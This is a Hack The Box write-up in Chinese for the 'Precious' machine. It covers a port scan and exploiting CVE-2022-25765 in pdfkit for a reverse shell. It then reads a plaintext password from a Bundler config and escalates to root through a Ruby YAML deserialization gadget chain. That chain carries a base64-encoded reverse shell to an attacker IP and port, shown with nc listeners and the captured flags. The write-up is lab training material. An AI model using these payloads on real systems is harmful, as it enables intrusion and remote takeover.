###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Precious
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.98 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.98:22
Open 10.129.228.98:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck=
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y=
|   256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
80/tcp open  http    syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先把網域加進來
```
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts

10.129.228.98   precious.htb
```

在這個框框裡面輸入`http://10.10.14.70/`會下載一個pdf
```
Convert Web Page to PDF

Enter URL to fetch

http://10.10.14.70/
```

利用`exiftool`查看pdf，發現`pdfkit v0.8.6`可以搜尋到[CVE-2022-25765](https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file)
```
┌──(kali㉿kali)-[~/htb]
└─$ exiftool 8qlp6wirnwx90l07mg1s1ogv8xync9n2.pdf 
ExifTool Version Number         : 12.76
File Name                       : 8qlp6wirnwx90l07mg1s1ogv8xync9n2.pdf
Directory                       : .
File Size                       : 53 kB
File Modification Date/Time     : 2024:09:05 05:31:43-04:00
File Access Date/Time           : 2024:09:05 05:32:51-04:00
File Inode Change Date/Time     : 2024:09:05 05:32:51-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Generated by pdfkit v0.8.6
```

直接用
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb/exploit-CVE-2022-25765]
└─$ python3 exploit-CVE-2022-25765.py  -s 10.10.14.70 4444 -w http://precious.htb/ -p url
```

得shell進到`/home/ruby`可以看到有一個`.bundle`的檔案，可以發現`henry`的密碼`Q3c1AqGHtoI0aXAYFH`
```
ruby@precious:~$ ls -al
total 28
drwxr-xr-x 4 ruby ruby 4096 Sep  5 05:23 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 3 ruby ruby 4096 Sep  5 05:23 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile

ruby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

切成`henry`之後可以在`/home/henry`得user.txt
```
ruby@precious:~/.bundle$ su henry
Password: Q3c1AqGHtoI0aXAYFH

henry@precious:~$ cat user.txt
34a4638219330d6e0cc177ebfec46479
```

用`sudo -l`，查看`/opt/update_dependencies.rb`
```
henry@precious:/tmp$ sudo -l
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

發現他會存取`dependencies.yml`
```ruby
henry@precious:/tmp$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

參考[Blind Remote Code Execution through YAML Deserialization](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)

先準備好ruby的reverse之後，製作一個`dependencies.yml`
```
┌──(kali㉿kali)-[~]
└─$ echo -n "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"10.10.14.70\",4445))'" | base64
cnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygiMTAuMTAuMTQuNzAiLDQ0NDUpKSc=
```

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "echo cnVieSAtcnNvY2tldCAtZSdzcGF3bigic2giLFs6aW4sOm91dCw6ZXJyXT0+VENQU29ja2V0Lm5ldygiMTAuMTAuMTQuNzAiLDQ0NDUpKSc= | base64 -d | bash"
         method_id: :resolve

```

開nc後執行得root，可在/root得root.txt
```
┌──(kali㉿kali)-[~]
└─$ rlwrap -cAr nc -nvlp4445 

henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb

whoami
root
cd /root
ls
root.txt
cat root.txt
ed2f2f9422d0c5b97255a2fbb7d7027b
```

